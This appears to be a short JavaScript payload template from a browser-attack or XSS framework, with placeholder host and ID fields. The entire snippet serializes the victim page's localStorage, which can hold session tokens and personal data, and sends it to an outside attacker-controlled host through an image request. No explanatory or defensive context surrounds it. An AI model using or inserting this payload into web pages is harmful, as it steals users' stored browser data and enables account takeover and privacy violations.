if ('localStorage' in window && window['localStorage'] !== null) {
    new Image().src = '<-|HOST|->rev?id=<-|ID|->&value=localStorage='+JSON.stringify(window['localStorage']);
}